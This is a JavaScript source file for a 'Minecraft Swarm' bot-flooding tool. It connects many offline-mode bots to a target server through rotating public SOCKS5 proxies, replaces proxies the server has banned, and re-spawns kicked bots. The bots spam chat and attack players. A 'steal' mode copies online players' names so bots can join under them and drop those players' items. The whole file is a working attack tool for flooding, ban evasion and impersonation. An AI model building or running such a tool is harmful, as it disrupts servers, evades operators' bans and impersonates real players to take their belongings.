// === MINECRAFT SWARM AUTO-PROXY v9.0 ===
// Credits: Smile B
// GitHub: Smile-B14

'use strict'

const mineflayer = require('mineflayer')
const readline = require('readline')
const { pathfinder, Movements, goals: { GoalFollow, GoalNearXZ } } = require('mineflayer-pathfinder')
const { SocksProxyAgent } = require('socks-proxy-agent')
const https = require('https')
const blessed = require('blessed')

const CFG = {
  minJoinGap: 3800,
  maxJoinGap: 5600,
  followRadius: 40,
  followDistance: 2,
  hitDistance: 3.5,
  aiTick: 400,
  authPassword: '12345',
  chatDelay: 1500 
}

const states = new Map()
const botNames = new Set()
const queue = []
let queueSeq = 0
let queueTimer = null
let nextConnectAt = 0

let aiEnabled = true
let hitEnabled = true
let logsEnabled = false
let spamTimer = null
let infiniteSpawn = false
let spawnInterval = null
let isStealMode = false

// Auto-replenish logic
let maintainCount = 0

let targetHost = ''
let targetPort = null
let targetVersion = null
let customNames = []

const proxyPool = []
const deadProxiesGlobal = new Set()
const usedProxiesForServer = new Map()
const bannedProxiesForServer = new Map()

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
const text = v => typeof v === 'string' ? v : JSON.stringify(v)

// Global crash preventers
process.on('uncaughtException', (err) => uiLog(`{red-fg}CRASH PREVENTED: ${err.message}{/}`))
process.on('unhandledRejection', (err) => uiLog(`{red-fg}CRASH PREVENTED: ${err}{/}`))

// --- STANDARD READLINE FOR SETUP ---
const setupRl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
const ask = q => new Promise(resolve => setupRl.question(q, resolve))

async function initialSetup() {
  console.log('\n=== MINECRAFT SWARM AUTO-PROXY v9.0 ===')
  console.log('Credits: Smile B\n')
  
  const stealMode = await ask('Enable Steal Player Mode initially? (y/n): ')
  if (stealMode.trim().toLowerCase() === 'y') isStealMode = true

  targetHost = (await ask('Target Server IP: ')).trim()
  
  const portText = (await ask('Port (blank = auto): ')).trim()
  if (portText) targetPort = Number(portText)
  
  const versionText = (await ask('Version (blank = auto): ')).trim()
  if (versionText && versionText.toLowerCase() !== 'auto') targetVersion = versionText

  const countText = (await ask('How many bots to maintain? (0 = infinite spam): ')).trim()
  const count = parseInt(countText || '0')
  
  setupRl.close() // Close standard input to prevent double typing in UI

  // Fetch proxies before UI starts
  console.log('Fetching public SOCKS5 proxies...')
  const fetched = await fetchProxies()
  proxyPool.push(...fetched)
  console.log(`Auto-loaded ${proxyPool.length} SOCKS5 proxies.`)

  return count
}

// --- BLESSED UI SETUP ---
let screen, header, logBox, menuBox, inputBox

function initUI() {
  screen = blessed.screen({
    smartCSR: true,
    title: 'Minecraft Swarm v9.0 | Smile B',
    fullUnicode: true,
    style: { fg: 'white', bg: 'black' }
  })

  header = blessed.box({
    parent: screen,
    top: 0, left: 0, width: '100%', height: 3,
    border: { type: 'line' },
    style: { border: { fg: 'cyan' }, fg: 'white', bold: true },
    tags: true,
    content: ' {cyan-fg}MINECRAFT SWARM v9.0{/} | {magenta-fg}Credits: Smile B{/} - Initializing...'
  })

  logBox = blessed.log({
    parent: screen,
    top: 3, left: 0, width: '70%', bottom: 3,
    border: { type: 'line' },
    style: { border: { fg: 'green' } },
    tags: true,
    scrollable: true,
    alwaysScroll: true,
    scrollbar: { ch: ' ', track: { bg: 'gray' }, style: { bg: 'cyan' } },
    label: ' Live Logs '
  })

  menuBox = blessed.box({
    parent: screen,
    top: 3, right: 0, width: '30%', bottom: 3,
    border: { type: 'line' },
    style: { border: { fg: 'magenta' } },
    tags: true,
    label: ' Status & Commands '
  })

  // Fixed input box to prevent double typing
  inputBox = blessed.textbox({
    parent: screen,
    bottom: 0, left: 0, width: '100%', height: 3,
    border: { type: 'line' },
    style: { border: { fg: 'yellow' }, fg: 'white' },
    label: ' Input (Type command & press Enter) '
  })

  inputBox.on('submit', (text) => {
    handleInput(text.trim())
    inputBox.clearValue()
    inputBox.readInput() // Keep listening without conflicting with readline
  })
  
  inputBox.readInput()
  screen.render()
}

function uiLog(msg) {
  try {
    if (logBox) {
      logBox.log(msg)
      screen.render()
    } else {
      console.log(msg.replace(/\{[^}]+\}/g, ''))
    }
  } catch (e) {
    console.log(msg.replace(/\{[^}]+\}/g, ''))
  }
}

function updateUI() {
  if (!screen) return
  let online = 0, connecting = 0
  for (const s of states.values()) {
    if (s.connected) online++
    else if (s.connecting) connecting++
  }
  
  header.setContent(` {cyan-fg}MINECRAFT SWARM v9.0{/} | {magenta-fg}Credits: Smile B{/} | {green-fg}Online: ${online}{/} | {yellow-fg}Connecting: ${connecting}{/} | Target: ${maintainCount === 0 ? 'INF' : maintainCount} | Dead Proxies: ${deadProxiesGlobal.size}`)
  
  menuBox.setContent(
    `{cyan-fg}=== Settings ==={/}\n` +
    ` {bold}Target:{/} ${targetHost}:${targetPort || 'auto'}\n` +
    ` AI Movement: ${aiEnabled ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
    ` Attacking: ${hitEnabled ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
    ` Chat Logs: ${logsEnabled ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
    ` Infinite Spawn: ${infiniteSpawn ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
    ` Spam: ${spamTimer ? '{green-fg}ACTIVE{/}' : '{red-fg}OFF{/}'}\n` +
    ` Steal Mode: ${isStealMode ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
    `\n{magenta-fg}=== Commands ==={/}\n` +
    ` {bold}add <count>{/} (0 = inf)\n` +
    ` {bold}stopjoin{/} (halts queue)\n` +
    ` {bold}spam <ms> <msg>{/}\n` +
    ` {bold}stopspam{/}\n` +
    ` {bold}steal on/off{/} (toggle)\n` +
    ` {bold}ai on/off{/}\n` +
    ` {bold}hit on/off{/}\n` +
    ` {bold}logs on/off{/}\n` +
    ` {bold}quit{/}\n`
  )
  screen.render()
}

// --- PROXY & MINEFLAYER LOGIC ---
async function fetchProxies() {
  return new Promise((resolve) => {
    https.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all', (res) => {
      let data = ''
      res.on('data', chunk => data += chunk)
      res.on('end', () => {
        try {
          const list = data.split('\r\n').filter(Boolean).map(p => {
            const [host, port] = p.split(':')
            if (host && port) return { host, port: parseInt(port), proxyUrl: `socks5://${host}:${port}` }
            return null
          }).filter(Boolean)
          resolve(list)
        } catch (e) { resolve([]) }
      })
    }).on('error', () => resolve([]))
  })
}

// Auto-refresh proxies every 60 seconds
setInterval(async () => {
  try {
    const fetched = await fetchProxies()
    let added = 0
    for (const p of fetched) {
      if (!proxyPool.find(x => x.proxyUrl === p.proxyUrl)) {
        proxyPool.push(p)
        added++
      }
    }
    if (added > 0) {
      uiLog(`{cyan-fg}Auto-refresh: Added ${added} new proxies. Total: ${proxyPool.length}{/}`)
      updateUI()
    }
  } catch (e) {}
}, 60000)

function getProxyForServer(serverHost) {
  const used = usedProxiesForServer.get(serverHost) || new Set()
  const banned = bannedProxiesForServer.get(serverHost) || new Set()
  const available = proxyPool.filter(p => !deadProxiesGlobal.has(p.proxyUrl) && !banned.has(p.proxyUrl) && !used.has(p.proxyUrl))
  
  if (available.length === 0) {
    const recyclable = proxyPool.filter(p => !deadProxiesGlobal.has(p.proxyUrl) && !banned.has(p.proxyUrl))
    if (recyclable.length > 0) return recyclable[Math.floor(Math.random() * recyclable.length)]
    const anyAlive = proxyPool.filter(p => !deadProxiesGlobal.has(p.proxyUrl))
    if (anyAlive.length > 0) return anyAlive[Math.floor(Math.random() * anyAlive.length)]
    return null
  }
  const proxy = available[Math.floor(Math.random() * available.length)]
  used.add(proxy.proxyUrl)
  usedProxiesForServer.set(serverHost, used)
  return proxy
}

function banProxy(serverHost, proxy, reason) {
  if (!proxy) return
  deadProxiesGlobal.add(proxy.proxyUrl)
  const banned = bannedProxiesForServer.get(serverHost) || new Set()
  banned.add(proxy.proxyUrl)
  bannedProxiesForServer.set(serverHost, banned)
  uiLog(`{red-fg}Proxy ${proxy.host}:${proxy.port} blacklisted (${reason}). Total dead: ${deadProxiesGlobal.size}{/}`)
  updateUI()
}

function generateRealisticName() {
  if (customNames.length > 0) return customNames.shift()
  const prefixes = ['xX', 'Itz', 'Pro', 'The', 'i', '_', 'Mr', 'Lil', 'xX_', 'The_']
  const names = ['Steve', 'Alex', 'Pixel', 'Block', 'Craft', 'Mine', 'Epic', 'God', 'Dark', 'Shadow', 'Cool', 'Smart', 'Sniper', 'Gamer', 'Noob', 'King', 'Boss', 'PvP', 'Slayer', 'Zombie', 'Creeper']
  const suffixes = ['Xx', '_Xx', 'YT', '99', '123', '_', 'Pro', 'GG', '420', '69', '777', 'x', '_']
  let name = ''
  const r = Math.random()
  if (r < 0.25) name = `xX${names[Math.floor(Math.random()*names.length)]}Xx`
  else if (r < 0.5) name = `${names[Math.floor(Math.random()*names.length)]}_${Math.floor(Math.random() * 9999)}`
  else if (r < 0.75) name = `${names[Math.floor(Math.random()*names.length)]}${suffixes[Math.floor(Math.random()*suffixes.length)]}`
  else name = `${prefixes[Math.floor(Math.random()*prefixes.length)]}${names[Math.floor(Math.random()*names.length)]}`
  if (Math.random() < 0.4 && name.length < 13) name += Math.floor(Math.random() * 999)
  name = name.replace(/[^A-Za-z0-9_]/g, '')
  if (name.length < 4) name += Math.floor(Math.random() * 9999)
  if (name.length > 16) name = name.substring(0, 16)
  return name
}

// --- STEAL MODE ---
async function stealPlayerNames(host, port) {
  return new Promise((resolve) => {
    uiLog(`{magenta-fg}[Steal]{/} Connecting to ${host} to read player list...`)
    const tempName = generateRealisticName()
    const opts = { host, username: tempName, auth: 'offline', hideErrors: true }
    if (port) opts.port = port
    
    let bot
    try { bot = mineflayer.createBot(opts) }
    catch (e) { resolve([]); return }
    
    let resolved = false
    const finish = () => {
      if (resolved) return
      resolved = true
      const players = Object.keys(bot.players || {}).filter(p => p !== tempName)
      uiLog(`{magenta-fg}[Steal]{/} Found ${players.length} players. Disconnecting...`)
      try { bot.quit() } catch {}
      resolve(players)
    }
    
    bot.once('spawn', () => setTimeout(finish, 3000))
    bot.on('end', finish)
    bot.on('error', (err) => {
      uiLog(`{red-fg}[Steal] Error: ${err.message}{/}`)
      finish()
    })
    setTimeout(finish, 10000)
  })
}

function enqueue(state, delay = 0, reason = 'retry') {
  state.queued = true
  state.queueReason = reason
  queue.push({ state, readyAt: Date.now() + Math.max(0, delay), seq: queueSeq++ })
  scheduleQueue()
}

function scheduleQueue() {
  if (queueTimer) clearTimeout(queueTimer)
  queueTimer = null
  if (!queue.length) return
  const now = Date.now()
  const earliest = Math.min(...queue.map(x => x.readyAt))
  queueTimer = setTimeout(runQueue, Math.max(0, Math.max(earliest, nextConnectAt) - now))
}

function runQueue() {
  queueTimer = null
  if (!queue.length) return
  const now = Date.now()
  if (now < nextConnectAt) return scheduleQueue()

  const ready = queue.filter(x => x.readyAt <= now)
  if (!ready.length) return scheduleQueue()
  const entry = ready[0]
  queue.splice(queue.indexOf(entry), 1)
  entry.state.queued = false
  const joinDelay = CFG.minJoinGap + Math.random() * (CFG.maxJoinGap - CFG.minJoinGap)
  nextConnectAt = Date.now() + joinDelay
  try { connectBot(entry.state) } 
  catch (e) {
    uiLog(`{red-fg}Queue error: ${e.message}. Retrying...{/}`)
    entry.state.proxy = getProxyForServer(targetHost)
    enqueue(entry.state, 3000, 'queue error retry')
  }
  scheduleQueue()
}

function findTarget(bot) {
  try {
    let target = bot.nearestEntity(e => e.type === 'player' && e.username && e.username !== bot.username && !botNames.has(e.username.toLowerCase()))
    if (!target) target = bot.nearestEntity(e => e.type === 'mob' && e.position)
    if (!target) target = bot.nearestEntity(e => e.type === 'animal' && e.position)
    return target
  } catch { return null }
}

async function dropAllItems(state) {
  try {
    const bot = state.bot
    if (!bot) return
    await bot.unequip('head').catch(() => {})
    await bot.unequip('torso').catch(() => {})
    await bot.unequip('legs').catch(() => {})
    await bot.unequip('feet').catch(() => {})
    for (const item of bot.inventory.items()) {
      await bot.tossStack(item).catch(() => {})
    }
    bot.setControlState('drop', true)
    setTimeout(() => bot.setControlState('drop', false), 2000)
    uiLog(`{magenta-fg}[${state.username}] Dropping all items!{/}`)
  } catch (e) {}
}

function startAI(state) {
  try {
    if (state.aiTimer) clearInterval(state.aiTimer)
    const bot = state.bot
    if (!bot?.entity) return
    const movements = new Movements(bot)
    movements.canDig = true 
    movements.allow1by1towers = false
    movements.maxDropDown = 3
    bot.pathfinder.setMovements(movements)
  } catch (e) {}

  state.aiTimer = setInterval(async () => {
    try {
      if (!aiEnabled || !state.connected || !state.bot?.entity) return
      const bot = state.bot
      const target = findTarget(bot)
      
      if (target) {
        const d = bot.entity.position.distanceTo(target.position)
        if (d <= CFG.followRadius) {
          try { bot.pathfinder.setGoal(new GoalFollow(target, CFG.followDistance), true) } catch {}
          if (hitEnabled && d <= CFG.hitDistance && Date.now() - state.lastHit > (400 + Math.random() * 400)) {
            state.lastHit = Date.now()
            const offsetX = (Math.random() - 0.5) * 0.5
            const offsetY = (Math.random() - 0.5) * 0.5
            try {
              await bot.lookAt(target.position.offset(offsetX, 1.4 + offsetY, offsetX), true)
              bot.attack(target, true)
            } catch {}
          }
          return
        }
      } else {
        if (!bot.pathfinder.isMoving() && Math.random() < 0.3) {
          const x = bot.entity.position.x + (Math.random() * 20 - 10)
          const z = bot.entity.position.z + (Math.random() * 20 - 10)
          try { bot.pathfinder.setGoal(new GoalNearXZ(x, z, 2)) } catch {}
        }
        if (Math.random() < 0.1) {
          try { bot.setControlState('jump', true); setTimeout(() => bot.setControlState('jump', false), 300) } catch {}
        }
        if (Math.random() < 0.05) {
          try {
            const block = bot.blockAtCursor(4)
            if (block && block.name !== 'air' && block.name !== 'bedrock' && bot.canDigBlock(block)) {
              bot.dig(block).catch(() => {}) 
            }
          } catch {}
        }
      }
    } catch (e) {}
  }, CFG.aiTick)
}

function handleAuth(state, raw) {
  try {
    if (!state.connected) return
    const msg = String(raw || '').trim().toLowerCase()
    if (!msg) return
    if (msg.includes('/register') || msg.includes('please register')) {
      try { state.bot.chat(`/register ${CFG.authPassword} ${CFG.authPassword}`) } catch {}
    } else if (msg.includes('/login') || msg.includes('please login')) {
      try { state.bot.chat(`/login ${CFG.authPassword}`) } catch {}
    }
  } catch {}
}

function connectBot(state) {
  state.connecting = true
  const proxyTag = state.proxy ? `{yellow-fg}[P]{/}` : `{red-fg}[D]{/}`
  uiLog(`{cyan-fg}[${state.username}]{/} ${proxyTag} Connecting to ${targetHost}...`)

  const opts = { host: targetHost, username: state.username, auth: 'offline', keepAlive: true, hideErrors: true, port: targetPort, version: targetVersion }
  if (state.proxy) {
    try { opts.agent = new SocksProxyAgent(state.proxy.proxyUrl) } 
    catch (e) {
      banProxy(targetHost, state.proxy, 'Agent Init Error')
      state.connecting = false
      state.proxy = getProxyForServer(targetHost)
      return enqueue(state, 1000, 'proxy init error retry')
    }
  }

  let bot
  try { bot = mineflayer.createBot(opts) }
  catch (err) {
    uiLog(`{red-fg}[${state.username}] CREATE ERROR: ${err.message}. Retrying...{/}`)
    state.connecting = false
    state.proxy = getProxyForServer(targetHost)
    return enqueue(state, 5000, 'retry')
  }

  state.bot = bot
  try { bot.loadPlugin(pathfinder) } catch {}

  bot.once('spawn', () => {
    state.connecting = false
    state.connected = true
    uiLog(`{green-fg}[${state.username}] JOINED.{/} Starting AI...`)
    updateUI()
    startAI(state)
    if (state.isStolen) dropAllItems(state)
  })

  bot.on('messagestr', msg => {
    handleAuth(state, msg)
    if (logsEnabled) uiLog(`{blue-fg}[CHAT -> ${state.username}]{/} ${msg}`)
  })

  bot.on('kicked', reason => {
    const reasonStr = text(reason).toLowerCase()
    uiLog(`{red-fg}[${state.username}] KICKED: ${text(reason)}{/}`)
    if (reasonStr.includes('whitelist') || reasonStr.includes('not whitelisted') || reasonStr.includes('banned')) {
      uiLog(`{red-fg}[${state.username}] Stopping retries (Whitelist/Ban detected).{/}`)
      state.permanentStop = true
      if (reasonStr.includes('ip_banned') || reasonStr.includes('ip banned')) {
        banProxy(targetHost, state.proxy, 'IP Banned by Server')
      }
    }
  })

  bot.on('error', err => {
    uiLog(`{red-fg}[${state.username}] ERROR: ${err.message}{/}`)
    if (state.proxy && (err.code === 'ECONNREFUSED' || err.code === 'ETIMEDOUT' || err.code === 'ECONNRESET' || err.message.includes('socks') || err.message.includes('proxy'))) {
      banProxy(targetHost, state.proxy, 'Connection Error')
    }
  })

  bot.on('end', () => {
    try { if (state.aiTimer) clearInterval(state.aiTimer) } catch {}
    state.connected = false
    state.connecting = false
    state.bot = null
    if (!state.permanentStop) {
      state.proxy = getProxyForServer(targetHost)
      enqueue(state, 3000, 'retry')
    } else {
      states.delete(state.username.toLowerCase())
      botNames.delete(state.username.toLowerCase())
    }
    updateUI()
  })
}

async function sendAll(message) {
  const online = [...states.values()].filter(s => s.connected && s.bot)
  for (const s of online) {
    try { s.bot.chat(message); await sleep(CFG.chatDelay) } catch {}
  }
  if (spamTimer) {
    uiLog(`{magenta-fg}[Spam] x${online.length} sent{/}`)
  } else {
    uiLog(`{magenta-fg}Finished sending message to ${online.length} bots.{/}`)
  }
}

function startSpam(message, interval) {
  if (spamTimer) clearInterval(spamTimer)
  spamTimer = setInterval(() => sendAll(message), interval)
  uiLog(`{magenta-fg}Spamming EVERY ${interval}ms.{/}`)
  updateUI()
}

function stopSpam() {
  if (spamTimer) { 
    clearInterval(spamTimer); spamTimer = null; 
    uiLog(`{magenta-fg}Spam stopped.{/}`) 
    updateUI()
  }
}

function startInfiniteSpawn() {
  if (infiniteSpawn) return
  infiniteSpawn = true
  maintainCount = 0 // Turn off maintenance if infinite
  uiLog(`{yellow-fg}Infinite spawn mode enabled. Generating bots continuously...{/}`)
  updateUI()
  spawnInterval = setInterval(() => {
    try {
      const name = generateRealisticName()
      if (!botNames.has(name.toLowerCase())) {
        botNames.add(name.toLowerCase())
        const state = { username: name, bot: null, connected: false, connecting: false, queued: false, intentionalStop: false, permanentStop: false, lastHit: 0, proxy: getProxyForServer(targetHost), isStolen: false }
        states.set(name.toLowerCase(), state)
        enqueue(state, 0, 'infinite spawn')
      }
    } catch (e) {}
  }, 1500)
}

function stopSpawn() {
  if (spawnInterval) clearInterval(spawnInterval)
  infiniteSpawn = false
  uiLog(`{yellow-fg}Infinite spawn stopped. Existing bots will remain.{/}`)
  updateUI()
}

function stopJoin() {
  if (spawnInterval) clearInterval(spawnInterval)
  infiniteSpawn = false
  maintainCount = 0 // Stop replenishing
  queue.length = 0 
  uiLog(`{yellow-fg}Queue cleared. No new bots will join. Online bots will stay.{/}`)
  updateUI()
}

function addBots(count) {
  if (count === 0) {
    startInfiniteSpawn()
  } else {
    maintainCount += count
    for (let i = 0; i < count; i++) {
      const name = generateRealisticName()
      botNames.add(name.toLowerCase())
      const state = { username: name, bot: null, connected: false, connecting: false, queued: false, intentionalStop: false, permanentStop: false, lastHit: 0, proxy: getProxyForServer(targetHost), isStolen: customNames.length > 0 }
      states.set(name.toLowerCase(), state)
      enqueue(state, 0, 'added via cmd')
    }
    uiLog(`{cyan-fg}Generating ${count} new bots. Target total: ${maintainCount}{/}`)
  }
}

// Auto-replenish bots if they get banned/disconnected
setInterval(() => {
  if (maintainCount > 0 && !infiniteSpawn) {
    let aliveBots = 0
    for (const s of states.values()) {
      if (!s.permanentStop) aliveBots++
    }
    if (aliveBots < maintainCount) {
      const needed = maintainCount - aliveBots
      uiLog(`{yellow-fg}Maintaining count: Replacing ${needed} lost bot(s).{/}`)
      for (let i = 0; i < needed; i++) {
        const name = generateRealisticName()
        botNames.add(name.toLowerCase())
        const state = { username: name, bot: null, connected: false, connecting: false, queued: false, intentionalStop: false, permanentStop: false, lastHit: 0, proxy: getProxyForServer(targetHost), isStolen: customNames.length > 0 }
        states.set(name.toLowerCase(), state)
        enqueue(state, 0, 'replacement')
      }
    }
  }
}, 5000)

async function toggleSteal(mode) {
  if (mode === 'on') {
    isStealMode = true
    uiLog(`{magenta-fg}[Steal] Mode ON. Pausing queue to scan server...{/}`)
    stopJoin() // Pause current spawns so we can scan
    customNames = await stealPlayerNames(targetHost, targetPort)
    if (customNames.length === 0) {
      uiLog('{red-fg}[Steal] Failed to read players. Use random names instead.{/}')
      isStealMode = false
    } else {
      uiLog(`{green-fg}[Steal] Successfully stole ${customNames.length} names! Type 'add 10' to spawn them.{/}`)
    }
  } else {
    isStealMode = false
    customNames = []
    uiLog(`{magenta-fg}[Steal] Mode OFF. Future bots will use random names.{/}`)
  }
  updateUI()
}

function handleInput(input) {
  try {
    const space = input.indexOf(' ')
    const cmd = (space < 0 ? input : input.slice(0, space)).toLowerCase()
    const rest = space < 0 ? '' : input.slice(space + 1).trim()

    if (cmd === 'add') {
      const n = parseInt(rest)
      if (isNaN(n) || n < 0) uiLog('{red-fg}Use: add <number> (0 for infinite){/}')
      else addBots(n)
    }
    else if (cmd === 'spam') {
      const p = rest.indexOf(' ')
      if (p < 0) uiLog('{red-fg}Use: spam <interval_ms> <message> (Example: spam 5000 Hello){/}')
      else {
        const interval = parseInt(rest.slice(0, p))
        if (isNaN(interval) || interval < 1000) uiLog('{red-fg}Interval must be a number >= 1000. Example: spam 5000 Hello{/}')
        else startSpam(rest.slice(p + 1).trim(), interval)
      }
    }
    else if (cmd === 'stopspam') stopSpam()
    else if (cmd === 'stopspawn') stopSpawn()
    else if (cmd === 'stopjoin') stopJoin()
    else if (cmd === 'steal') toggleSteal(rest.toLowerCase())
    else if (cmd === 'ai') { aiEnabled = rest === 'on'; uiLog(`{yellow-fg}AI ${aiEnabled ? 'ON' : 'OFF'}{/}`); updateUI() }
    else if (cmd === 'hit') { hitEnabled = rest === 'on'; uiLog(`{yellow-fg}Hitting ${hitEnabled ? 'ON' : 'OFF'}{/}`); updateUI() }
    else if (cmd === 'logs') { logsEnabled = rest === 'on'; uiLog(`{yellow-fg}Logs ${logsEnabled ? 'ON' : 'OFF'}{/}`); updateUI() }
    else if (cmd === 'quit') {
      uiLog('{red-fg}Disconnecting all...{/}')
      for (const s of states.values()) { try { s.bot?.quit() } catch {} }
      setTimeout(() => process.exit(0), 500)
    }
    else uiLog('{red-fg}Unknown command. See right panel for list.{/}')
  } catch (e) {
    uiLog(`{red-fg}Command error: ${e.message}{/}`)
  }
}

async function main() {
  try {
    const initialCount = await initialSetup()
    
    initUI() // Start visual UI
    
    uiLog('{cyan-fg}=== MINECRAFT SWARM AUTO-PROXY v9.0 ==={/}')
    uiLog('{magenta-fg}Credits: Smile B{/}')
    uiLog(`{green-fg}Auto-loaded ${proxyPool.length} SOCKS5 proxies.{/}`)
    uiLog('{cyan-fg}Proxies will auto-refresh every 60 seconds.{/}')
    
    if (isStealMode) {
      uiLog('{magenta-fg}[Steal]{/} Scanning server for initial names...')
      customNames = await stealPlayerNames(targetHost, targetPort)
      if (customNames.length > 0) {
        uiLog(`{green-fg}[Steal]{/} Stole ${customNames.length} names!{/}`)
      } else {
        uiLog('{red-fg}[Steal] Failed. Using random names.{/}')
        isStealMode = false
      }
    }
    
    addBots(initialCount) 
    uiLog(`{green-fg}Setup complete! Type commands in the input box below.{/}`)
    updateUI()
  } catch (err) {
    console.error('Fatal startup error:', err)
    process.exit(1)
  }
}

main()
